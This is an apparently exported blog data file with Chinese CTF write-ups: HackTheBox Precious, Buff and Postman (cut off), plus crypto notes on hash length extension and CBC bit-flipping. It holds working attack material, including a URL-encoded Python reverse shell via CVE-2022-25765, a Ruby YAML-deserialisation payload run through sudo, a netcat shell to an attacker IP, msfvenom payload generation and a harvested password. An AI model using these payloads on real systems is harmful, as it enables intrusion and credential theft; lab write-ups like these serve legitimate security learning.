{"meta":{"title":"xXxYOLOxXx","subtitle":"xXxYOLOxXx","description":"Explorer for unknown.","author":"xXxYOLOxXx","url":"https://yoloyolo.top","root":"/"},"pages":[{"title":"About","date":"2021-01-16T06:01:15.000Z","updated":"2021-06-03T10:47:09.000Z","comments":true,"path":"about/index.html","permalink":"https://yoloyolo.top/about/index.html","excerpt":"","text":"HQU 2018 Love CTF and Info_Sec yolo-yolo@qq.com"},{"title":"Categories","date":"2021-01-16T06:01:20.000Z","updated":"2021-01-16T06:03:34.000Z","comments":true,"path":"categories/index.html","permalink":"https://yoloyolo.top/categories/index.html","excerpt":"","text":""},{"title":"Links","date":"2021-01-16T06:07:24.000Z","updated":"2021-01-16T06:15:29.000Z","comments":true,"path":"links/index.html","permalink":"https://yoloyolo.top/links/index.html","excerpt":"","text":""},{"title":"Tags","date":"2021-01-16T06:01:18.000Z","updated":"2021-01-16T06:04:53.000Z","comments":true,"path":"tags/index.html","permalink":"https://yoloyolo.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"HackTheBox_Precious","slug":"HackTheBox-Precious","date":"2023-03-02T12:12:08.000Z","updated":"2023-03-02T12:32:06.290Z","comments":true,"path":"2023/03/02/HackTheBox-Precious/","link":"","permalink":"https://yoloyolo.top/2023/03/02/HackTheBox-Precious/","excerpt":"æ—¥å¸¸è®°å½•","text":"æ—¥å¸¸è®°å½• HackTheBox_Precious ä¿¡æ¯æ”¶é›† ç«¯å£æ‰«æ 1nmap -Pn -sV -T5 -v 10.10.11.189 1234567Nmap scan report for precious.htb (10.10.11.189)Host is up (0.37s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)80&#x2F;tcp open http nginx 1.18.0Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel è·¯å¾„æšä¸¾ æœªæšä¸¾å‡ºè·¯å¾„ æ¼æ´åˆ©ç”¨ è®¿é—®80ç«¯å£çš„WEBæœåŠ¡ 1curl http://10.10.11.189/ -I 1234567HTTP&#x2F;1.1 302 Moved TemporarilyServer: nginx&#x2F;1.18.0Date: Thu, 02 Mar 2023 02:20:41 GMTContent-Type: text&#x2F;htmlContent-Length: 145Connection: keep-aliveLocation: http:&#x2F;&#x2F;precious.htb&#x2F; è·³è½¬è‡³åŸŸåprecious.htb æ·»åŠ åŸŸåè§£æ 1echo -e &quot;10.10.11.189\\tprecious.htb&quot; &gt;&gt; /etc/hosts ä½¿ç”¨åŸŸåå¯ä»¥è¿›è¡Œè®¿é—® æœ¬åœ°å¼€å¯HTTPæœåŠ¡ 1cd /tmp &amp;&amp; python -m http.server 80 å°†æœ¬åœ°HTTPæœåŠ¡é¡µé¢è½¬ä¸ºPDF 1curl http://precious.htb -d &quot;url=http://10.10.*.*/&quot; -o pdf æŸ¥çœ‹æ–‡ä»¶EXIFä¿¡æ¯ 1exiftool pdf 123456789101112131415ExifTool Version Number : 11.16File Name : pdfDirectory : .File Size : 22 kBFile Modification Date&#x2F;Time : 2023:03:02 10:42:26+08:00File Access Date&#x2F;Time : 2023:03:02 10:42:33+08:00File Inode Change Date&#x2F;Time : 2023:03:02 10:42:26+08:00File Permissions : rw-r--r--File Type : PDFFile Type Extension : pdfMIME Type : application&#x2F;pdfPDF Version : 1.4Linearized : NoPage Count : 1Creator : Generated by pdfkit v0.8.6 æœç´¢pdfkit v0.8.6ï¼Œæ‰¾åˆ°ç›¸å…³æ¼æ´CVE-2022-25765 https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 éªŒè¯æ¼æ´ 1curl http://precious.htb/ -d &quot;url=http%3A//10.10.*.*/%3Fname%3D%2520%60id%60&quot; 110.10.11.189 - - [02&#x2F;Mar&#x2F;2023 11:34:00] &quot;GET &#x2F;?name&#x3D;%20uid&#x3D;1001(ruby)%20gid&#x3D;1001(ruby)%20groups&#x3D;1001(ruby) HTTP&#x2F;1.1&quot; 200 - åå¼¹Shell 1nc -lvnp 9998 1curl http://precious.htb/ -d &quot;url=http%3A//10.10.*.*/%3Fname%3D%2520%60python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2710.10.*.*%27%2C9998%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27/bin/bash%27%2C%27-i%27%5D%29%3B%22%60&quot; è·å–tty 1python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27; 1cat /home/ruby/.bundle/config å¾—åˆ°ç”¨æˆ·henryçš„è´¦æˆ·ä¿¡æ¯ 12---BUNDLE_HTTPS:&#x2F;&#x2F;RUBYGEMS__ORG&#x2F;: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot; SSHç™»å…¥ 12ssh henry@10.10.11.189Q3c1AqGHtoI0aXAYFH æŸ¥çœ‹flag 12cat /home/henry/user.txt c2495bbeca89a6c2caaabb23a05934a9 æƒé™æå‡ 1sudo -l 12345Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;binUser henry may run the following commands on precious: (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;ruby &#x2F;opt&#x2F;update_dependencies.rb 1cat update_dependencies.rb 123456789101112131415161718192021222324252627282930# Compare installed dependencies with those specified in &quot;dependencies.yml&quot;require &quot;yaml&quot;require &#x27;rubygems&#x27;# TODO: update versions automaticallydef update_gems()enddef list_from_file YAML.load(File.read(&quot;dependencies.yml&quot;))enddef list_local_gems Gem::Specification.sort_by&#123; |g| [g.name.downcase, g.version] &#125;.map&#123;|g| [g.name, g.version.to_s]&#125;endgems_file = list_from_filegems_local = list_local_gemsgems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts &quot;Installed version differs from the one specified in file: &quot; + local_name else puts &quot;Installed version is equals to the one specified in file: &quot; + local_name end end endend YAML.load()å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/ æ„é€ èƒ½å¤Ÿåˆ©ç”¨æ¼æ´çš„ymlæ–‡ä»¶ 1cd /tmp; vi /tmp/dependencies.yml æ–‡ä»¶å†…å®¹å¦‚ä¸‹ 12345678910111213141516171819---- !ruby/object:Gem::Installer i: x- !ruby/object:Gem::SpecFetcher i: y- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#x27;Kernel&#x27; method_id: :system git_set: &quot;python3 -c \\&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.*.*&#x27;,9997));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\\&quot;&quot; method_id: :resolve ç›‘å¬ç«¯å£ 1nc -lvnp 9997 è§¦å‘ååºåˆ—åŒ–æ¼æ´ 1sudo /usr/bin/ruby /opt/update_dependencies.rb è·å¾—rootæƒé™ï¼ŒæŸ¥çœ‹flag 12cat /root/root.txta6c3884ed3b917b870834758ab46f9f1","categories":[{"name":"WrtiteUp","slug":"WrtiteUp","permalink":"https://yoloyolo.top/categories/WrtiteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"}]},{"title":"Hash_Extend","slug":"Hash-Extend","date":"2023-02-21T11:21:17.000Z","updated":"2023-02-21T12:06:08.000Z","comments":true,"path":"2023/02/21/Hash-Extend/","link":"","permalink":"https://yoloyolo.top/2023/02/21/Hash-Extend/","excerpt":"æ—¥å¸¸è®°å½•","text":"æ—¥å¸¸è®°å½• pip install hashpumpy MD5, SHA1, SHA256æ¯è½®åŠ å¯†å—å¤§å°ä¸º64Byte(512Bits)ï¼Œå…¶ä¸­å‰56Byte(448Bits)ç”¨äºå­˜å‚¨åŠ å¯†æ•°æ®ï¼Œå8Byte(64Bits)ç”¨äºå­˜å‚¨æ•°æ®Bitä½æ•° SHA512æ¯è½®åŠ å¯†å—å¤§å°ä¸º128Byte(1024Bits)ï¼Œå…¶ä¸­å‰112Byte(896Bits)ç”¨äºå­˜å‚¨åŠ å¯†æ•°æ®ï¼Œå16Byte(128Bits)ç”¨äºå­˜å‚¨æ•°æ®Bitä½æ•° MD5å­˜å‚¨æ•°æ®é•¿åº¦æ—¶ä½¿ç”¨å°ç«¯æ’åºï¼ŒSHA1, SHA256, SHA512åˆ™ä½¿ç”¨å¤§ç«¯æ’åº SHA384åœ¨ä½¿ç”¨hashpumpy.pumpæ—¶ä¼šæŠ¥é”™ 1hashpumpy.error: unsupported hash size ä»¥ä¸ŠHashç®—æ³•å‡åŸºäºMerkle-DamgÃ¥rdç»“æ„ï¼ŒæŠ½è±¡æ¥çœ‹ï¼Œå¯ä»¥ç±»æ¯”äºå¯¹ç§°åŠ å¯†ä¸­çš„OFBæ¨¡å¼ï¼Œå³ä¸Šä¸€è½®çš„åŠ å¯†ç»“æœä¼šä½œä¸ºä¸‹ä¸€è½®åŠ å¯†çš„è¾“å…¥ ä»¥MD5ä¸ºä¾‹ æˆ‘ä»¬è¦åŠ å¯†æ˜æ–‡adminï¼Œæ­¤æ—¶æ˜æ–‡é•¿åº¦å°äºåŠ å¯†å—æ•°æ®é•¿åº¦ï¼Œåˆ™ä¼šè¢«å¡«å……\\x80\\x00\\x00\\x00... é‚£ä¹ˆåŠ å¯†å—ä¸º 1admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00\\x00\\x00\\x00 åœ¨å®Œæˆç¬¬ä¸€è½®åŠ å¯†ä¹‹åæˆ‘ä»¬ä¼šå¾—åˆ°è¿™ä¸€éƒ¨åˆ†çš„Hashå€¼ï¼Œå¦‚æœ‰åç»­éƒ¨åˆ†ï¼Œåˆ™è¿™éƒ¨åˆ†Hashå°†ä½œä¸ºè¾“å…¥å¯¹åä¸€è½®åŠ å¯†è¿›è¡Œå¤„ç† å‡è®¾å­˜åœ¨ä¸€ä¸ªè®¤è¯æ–¹å¼ï¼Œå°†ä»¥ä¸‹å†…å®¹ä½œä¸ºCookie username+signature ä¸”signature=MD5(secret+username) ä¸”åœ¨æ ¡éªŒæ–¹æ³•ä¸º MD5(secret+input_username) == signature æˆ‘ä»¬ä»¥Aliceèº«ä»½ç™»å…¥åå¾—åˆ°è¿™ä¸ªCookieï¼Œå³ MD5(secret+â€œAliceâ€) å¦‚æœsecreté•¿åº¦å·²çŸ¥ï¼Œå‡è®¾ä¸º6 é‚£ä¹ˆå¯ä»¥å¾—åˆ°ä»¥ä¸‹åŠ å¯†å—ï¼Œä»¥åŠå…¶MD5å€¼ 1??????Alice\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00 åœ¨åŠ å¯†å—åç»­å†…å®¹è¿½åŠ å†…å®¹Bobï¼Œåˆ™å¯ä»¥å°†ä¸Šä¸€éƒ¨åˆ†çš„MD5ä½œä¸ºä¸‹ä¸€è½®åŠ å¯†çš„è¾“å…¥ 1??????Alice\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00Bob å³å¯å¾—åˆ°è¿™éƒ¨åˆ†çš„MD5å€¼ åœ¨è¿›è¡Œè®¤è¯æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç”¨æˆ·åä»¥åŠå…¶ç›¸åº”çš„MD5 1username&#x3D;&quot;Alice\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00Bob&quot; æœåŠ¡å™¨åœ¨éªŒè¯èº«ä»½ 1MD5(secert+&quot;Alice\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00Bob&quot;) &#x3D;&#x3D; signature å³å®Œæˆäº†å“ˆå¸Œæ‰©å±•æ”»å‡»ï¼Œå¦‚æœæœåŠ¡å™¨å¯¹ç”¨æˆ·åçš„éªŒè¯å­˜åœ¨ä¸å®‰å…¨çš„é€»è¾‘ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½è¶Šæƒæ¼æ´","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"Hash","slug":"Hash","permalink":"https://yoloyolo.top/tags/Hash/"}]},{"title":"HackTheBox_Flippin_Bank","slug":"HackTheBox-Flippin-Bank","date":"2023-02-20T10:33:53.000Z","updated":"2023-02-20T10:47:07.000Z","comments":true,"path":"2023/02/20/HackTheBox-Flippin-Bank/","link":"","permalink":"https://yoloyolo.top/2023/02/20/HackTheBox-Flippin-Bank/","excerpt":"Dramatically solved.","text":"Dramatically solved. HackTheBox_Flippin_Bank 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import socketserver import socket, osfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import pad,unpadfrom Crypto.Random import get_random_bytesfrom binascii import unhexlifyfrom secret import FLAGwlcm_msg =&#x27;########################################################################\\n&#x27;+\\ &#x27;# Welcome to the Bank of the World #\\n&#x27;+\\ &#x27;# All connections are monitored and recorded #\\n&#x27;+\\ &#x27;# Disconnect IMMEDIATELY if you are not an authorized user! #\\n&#x27;+\\ &#x27;########################################################################\\n&#x27;key = get_random_bytes(16)iv = get_random_bytes(16)def encrypt_data(data): padded = pad(data.encode(),16,style=&#x27;pkcs7&#x27;) cipher = AES.new(key, AES.MODE_CBC,iv) enc = cipher.encrypt(padded) return enc.hex()def decrypt_data(encryptedParams): cipher = AES.new(key, AES.MODE_CBC,iv) paddedParams = cipher.decrypt( unhexlify(encryptedParams)) print(paddedParams) if b&#x27;admin&amp;password=g0ld3n_b0y&#x27; in unpad(paddedParams,16,style=&#x27;pkcs7&#x27;): return 1 else: return 0def send_msg(s, msg): enc = msg.encode() s.send(enc)def main(s): send_msg(s, &#x27;username: &#x27;) user = s.recv(4096).decode().strip() send_msg(s, user +&quot;&#x27;s password: &quot; ) passwd = s.recv(4096).decode().strip() send_msg(s, wlcm_msg) msg = &#x27;logged_username=&#x27; + user +&#x27;&amp;password=&#x27; + passwd try: assert(&#x27;admin&amp;password=g0ld3n_b0y&#x27; not in msg) except AssertionError: send_msg(s, &#x27;You cannot login as an admin from an external IP.\\nYour activity has been logged. Goodbye!\\n&#x27;) raise msg = &#x27;logged_username=&#x27; + user +&#x27;&amp;password=&#x27; + passwd send_msg(s, &quot;Leaked ciphertext: &quot; + encrypt_data(msg)+&#x27;\\n&#x27;) send_msg(s,&quot;enter ciphertext: &quot;) enc_msg = s.recv(4096).decode().strip() try: check = decrypt_data(enc_msg) except Exception as e: send_msg(s, str(e) + &#x27;\\n&#x27;) s.close() if check: send_msg(s, &#x27;Logged in successfully!\\nYour flag is: &#x27;+ FLAG) s.close() else: send_msg(s, &#x27;Please try again.&#x27;) s.close()class TaskHandler(socketserver.BaseRequestHandler): def handle(self): main(self.request)if __name__ == &#x27;__main__&#x27;: socketserver.ThreadingTCPServer.allow_reuse_address = True server = socketserver.ThreadingTCPServer((&#x27;0.0.0.0&#x27;, 1337), TaskHandler) server.serve_forever() CBCå­—èŠ‚ç¿»è½¬ï¼Ÿ ä¸€çœ¼CBCå­—èŠ‚ç¿»è½¬ çœ‹ä¸€åŠå‘ç°IVä¸å¯æ§ CBCå¯†ç å—æ„é€  æƒ³äº†ä¸€ä¸‹å¯ä»¥æ„é€ ä¼ªå¯†ç å— CBCå¤§æ¦‚åŠ è§£å¯†æµç¨‹å¦‚ä¸‹ 1Plain_Block -&gt; Xor(Last_Cipher_Block&#x2F;IV) -&gt; Block Cipher Encrypt -&gt; Cipher_Block -&gt; Xor(Last_Cipher_Block&#x2F;IV) -&gt; Plain_Block é¢˜ç›®ä¸­çš„æ‰€éœ€å¯†ç å—å¦‚ä¸‹ 123 Plain_Block_0 Plain_Block_1 Plain_Block_2 logged_username&#x3D; admin&amp;password&#x3D;g 0ld3n_b0yIV Cipher_Block_0 Cipher_Block_1 Cipher_Block_2 Key, IV, Plain_Block_0å›ºå®šï¼Œåˆ™Cipher_Block_0å›ºå®š æ”»å‡»æ€è·¯å¦‚ä¸‹ 123target = Plain_Block_1 ^ Cipher_Block_0Cipher_Block_1 = encrypt(target)Cipher_Block_2 = encrypt(Plain_Block_2 ^ Cipher_Block_1) æˆ‘ä»¬å¯ä»¥åœ¨Plain_Block_1ä¸Plain_Block_2ä¸­é—´æ’å…¥Plain_Block_Payload å¹¶ä¸”æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ 12Cipher_Block_Payload = encrypt(Plain_Block_Payload ^ Cipher_Block_1)Cipher_Block_Payload == Cipher_Block_1 åœ¨è¿™ç§æƒ…å†µä¸‹åˆ™æœ‰ 123Cipher_Block_Payload == Cipher_Block_1Cipher_Block_Payload ^ Plain_Block_2 == Cipher_Block_1 ^ Plain_Block_2encrypt(Cipher_Block_Payload ^ Plain_Block_2) == encrypt(Cipher_Block_1 ^ Plain_Block_2) == Cipher_Block_2 å³æˆ‘ä»¬å¯ä»¥è·å¾—Get Flagæƒ…å†µä¸‹Cipher_Block_2çš„å†…å®¹ ä½†æ˜¯Plain_Block_Payloadè¯¥å¦‚ä½•æ„é€ ï¼Ÿ Payloadæ˜æ–‡å¯†ç å—æ„é€  1234Cipher_Block_Payload == Cipher_Block_1encrypt(Plain_Block_Payload ^ Cipher_Block_1) == encrypt(Plain_Block_1 ^ Cipher_Block_0)Plain_Block_Payload ^ Cipher_Block_1 == Plain_Block_1 ^ Cipher_Block_0Plain_Block_Payload == Plain_Block_1 ^ Cipher_Block_0 ^ Cipher_Block_1 æ‰€éœ€çš„ä¸‰ä¸ªæ¡ä»¶å·²çŸ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾çš„å¾—åˆ°Plain_Block_Payload Encode &amp; Decode å°†æ„é€ çš„å†…å®¹ç”¨pwntoolså‘å‡ºåæ²¡æœ‰æ”¶åˆ°å“åº” å¤šæ¬¡è°ƒè¯•åå‘ç°é—®é¢˜æ‰€åœ¨ 12send_msg(s, user +&quot;&#x27;s password: &quot; )passwd = s.recv(4096).decode().strip() æœ¬åœ°ç”Ÿæˆç®—å‡ºPayload Hexå½¢å¼åè½¬å­—ç¬¦ä¸²æ˜¯ç”¨ISO-8859-1ç¼–ç ï¼Œè¿™ä¸ªå•å­—èŠ‚ç¼–ç åœ¨å¤„ç†\\x7aä»¥ä¸Šçš„å­—ç¬¦æ—¶å¾ˆå¥½ç”¨ï¼Œæ‰€ä»¥é¡ºæ‰‹å°±ç”¨è¿™ä¸ªç¼–ç å»å¤„ç†Payloadäº† ä½†æ˜¯é—®é¢˜éšä¹‹è€Œæ¥ 1UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xa6 in position 15: invalid start byte ä¹Ÿå°±æ˜¯æ„å‘³ç€æˆ‘çš„Payloadéœ€è¦èƒ½å¤Ÿè¢«UTF-8ç¼–ç å¤„ç† WTF? Guessing Game æ‰€ä»¥ç°åœ¨æ‰€èƒ½åšçš„ï¼Œå°±åªæœ‰å»ä¿®æ”¹Plain_Block_1çš„å†…å®¹ Plain_Block_1å†…å®¹å¦‚ä¸‹: 1?????&amp;password&#x3D;? çˆ†ç ´å…­ä½æ©ç ï¼Œè¿™ä¼šå½±å“Cipher_Block_1çš„ç»“æœ ç”±äºAESåŠ å¯†è¿‡ç¨‹çš„æ‰©æ•£æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å°†Cipher_Block_1çš„ç»“æœçœ‹æˆæ˜¯éšæœºçš„ æˆ‘ä»¬æ‰€éœ€è¦çš„ç»“æœæ˜¯Payload_Block_Payloadçš„16å­—èŠ‚å‡å°äº\\x80ï¼Œè¿™æ ·UTF-8ç¼–ç å°±èƒ½å¤„ç† æ¦‚ç‡ä¸º1/65536ï¼Œä½†å€¼å¾—ä¸€è¯• æˆ‘ä»¬å†ç†ä¸€éæ€è·¯ åŸå§‹å¯†ç å—å¦‚ä¸‹ 123 Plain_Block_0 Plain_Block_1 Plain_Block_2 logged_username&#x3D; admin&amp;password&#x3D;g 0ld3n_b0yIV Cipher_Block_0 Cipher_Block_1 Cipher_Block_2 æˆ‘ä»¬éœ€è¦çš„XORç»“æœå¦‚ä¸‹ 1target = Cipher_Block_0 ^ Plain_Block_1 ç°åœ¨æˆ‘ä»¬å¼€å§‹çˆ†ç ´Plain_Block_1ï¼Œå¯ä»¥å¾—åˆ°Tmp_Cipher_Block_1 123 Plain_Block_0 Tmp_Plain_Block_1 Tmp_Plain_Block_Payload Plain_Block_2 logged_username&#x3D; ?????&amp;password&#x3D;? ???????????????? 0ld3n_b0yIV Cipher_Block_0 Tmp_Cipher_Block_1 Tmp_Cipher_Block_Payload Cipher_Block_2 å¾—åˆ°çš„Tmp_Cipher_Block_1è§†ä¸ºéšæœºç”Ÿæˆï¼Œå¯ä»¥è½»æ¾å¾—åˆ°Tmp_Plain_Block_Payload 1Tmp_Plain_Block_Payload = Tmp_Cipher_Block_1 ^ target æˆ‘ä»¬æ‰€éœ€è¦ç¡®ä¿çš„ï¼Œå°±æ˜¯è¿™ä¸ªTmp_Plain_Block_Payloadå¯ä»¥è¢«UTF-8ç¼–ç å¤„ç† åœ¨çˆ†ç ´å‡ºTmp_Plain_Block_Payloadä¹‹åï¼Œç”±äºTmp_Cipher_Block_Payloadä¸Cipher_Block_1ç›¸ç­‰ï¼ŒCipher_Block_2ä¸ºé¢„æœŸå€¼ è¾“å…¥Cipher_Block_0 + Tmp_Cipher_Block_Payload + Cipher_Block_2å³å¯è·å¾—Flag ğŸ˜… ä¸éœ€è¦éªŒè¯å‰é¢çš„&quot;logged_username=&quot;æ˜¯å§ ç›´æ¥å­—èŠ‚ç¿»è½¬å°±å®Œäº‹äº† å¯†ç å—å¦‚ä¸‹ 1logged_username&#x3D; Admin&amp;password&#x3D;g 0ld3n_b0y 12decrypt(Block_Cipher_1)[0] == &quot;A&quot; ^ Block_Cipher_0[0]New_Block_Cipher_0[0] = &quot;A&quot; ^ &quot;a&quot; ^ Block_Cipher_0[0] ä»£å…¥å¾—åˆ° 1decrypt(Block_Cipher_1)[0] == &quot;a&quot; éš¾æ€ªåšçš„æœ‰ç‚¹è´¹åŠ²ï¼ŒåŸæ¥æ˜¯éé¢„æœŸäº†å•ŠğŸ˜…ï¼Œæ„Ÿè§‰è¿™ä¸ªæ€è·¯éƒ½èƒ½å‡ºä¸ªé¢˜äº†éƒ½","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"},{"name":"CBC","slug":"CBC","permalink":"https://yoloyolo.top/tags/CBC/"}]},{"title":"HackTheBox_Buff","slug":"HackTheBox-Buff","date":"2023-02-14T15:29:28.000Z","updated":"2023-02-14T15:30:33.000Z","comments":true,"path":"2023/02/14/HackTheBox-Buff/","link":"","permalink":"https://yoloyolo.top/2023/02/14/HackTheBox-Buff/","excerpt":"è¿Ÿæ¥çš„æ–‡ç« ","text":"è¿Ÿæ¥çš„æ–‡ç«  HackTheBox_Buff 2020/07/27 16:23:58 å‰æœŸå·¥ä½œ è¿æ¥æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è¿æ¥ä»£ç† ç½‘ç»œçŠ¶æ€ é¶æœº ä¿¡æ¯æ”¶é›† ç«¯å£æ‰«æ nmap -sT -Pn --top-port 1000 -sV -T5 10.10.10.198 Webè·¯å¾„æ‰«æ gobuster dir -w /usr/share/wordlists/directory-list-2.3-medium.txt -x .php -u http://10.10.10.198:8080/ æ¼æ´åˆ©ç”¨ ä»£ç†æµè§ˆå™¨ proxychains firefox å¾—åˆ°CMSç›¸å…³ä¿¡æ¯ æœç´¢ç›¸å…³æ¼æ´ searchsploit Gym 1.0 æ‰§è¡ŒEXP proxychains python 48506.py http://10.10.10.198:8080/ è·å–Shell æƒé™æå‡ æœåŠ¡å™¨å¼€å¯HTTPæœåŠ¡ pythom -m SimpleHTTPServer 9900 ä¸‹è½½ncä¸plink 12curl -O http:&#x2F;&#x2F;10.10.16.4:9900&#x2F;nc.execurl -O http:&#x2F;&#x2F;10.10.16.4:9900&#x2F;plink.exe ä½¿ç”¨ncåå¼¹shell 12nc -lvnp 9999nc.exe -e cmd.exe 10.10.16.4 9999 åå°è¿›ç¨‹ä¸­å‘ç°CloudMe tasklist | findstr CloudMe è¯¥è¿›ç¨‹åœ¨æœ¬åœ°å¼€å¯äº†8888ç«¯å£ netstat -ano | findstr 2556 ä½¿ç”¨plinkè¿›è¡Œç«¯å£è½¬å‘ plink.exe -R 9901:127.0.0.1:8888 root@10.10.16.4 -pw YOUR_PASSWORD æŸ¥çœ‹æœåŠ¡å™¨ç«¯å£ netstat -antlp | grep 9901 æœç´¢ç›¸å…³æ¼æ´ searchsploit cloudme ä½¿ç”¨EXP 44470.py 12searchsploit -m 44470.pycat 44470.py ä½¿ç”¨msfvenomæ„é€ payload msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f c ä¿®æ”¹payloadï¼Œä¸”ä¿®æ”¹ç«¯å£ä¸º9901ä¹‹åä¸Šä¼ EXPè‡³æœåŠ¡å™¨ scp 44470.py root@hk:/root/ ç›‘å¬ç«¯å£4444 nc -lvnp 4444 æ‰§è¡ŒEXP python 44470.py ææƒæˆåŠŸ æŸ¥çœ‹flag","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"}]},{"title":"HackTheBox_Postman","slug":"HackTheBox-Postman","date":"2023-02-14T15:22:53.000Z","updated":"2023-02-14T15:29:17.000Z","comments":true,"path":"2023/02/14/HackTheBox-Postman/","link":"","permalink":"https://yoloyolo.top/2023/02/14/HackTheBox-Postman/","excerpt":"è¿Ÿæ¥çš„æ–‡ç« ","text":"è¿Ÿæ¥çš„æ–‡ç«  HackTheBox_Postman 2020/01/15 19:55:48 ä¿¡æ¯æ”¶é›† ç«¯å£æ‰«æ nmap -sV -Pn -p 1-10000 -T5 -n -v -A 10.10.10.160 123456789101112131415Nmap scan report for 10.10.10.160Host is up (0.29s latency).Not shown: 9326 closed ports, 672 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))6379/tcp open redis Redis key-value store 4.0.910000/tcp open http MiniServ 1.910 (Webmin httpd)|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: MiniServ/1.910|_http-title: Site doesn&#x27;t have a title 